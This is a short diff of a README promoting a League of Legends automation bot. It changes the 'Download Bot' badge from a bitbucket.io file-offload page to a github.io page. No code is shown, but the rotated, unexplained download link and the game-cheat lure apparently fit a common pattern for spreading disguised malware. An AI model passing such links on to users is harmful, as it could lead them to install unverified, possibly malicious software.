@@ -6,7 +6,7 @@ League of Legends can be a blast… until it’s not. Whether you’re grinding 
 
 Play smart, automate smarter. Let your PC handle the grind while you chill.
 
-[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://fileoffload14.bitbucket.io)
+[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://LoL-Bot-cyfe.github.io/.github)
 ---
 
 ## 🤖 What Is the LoL Bot?
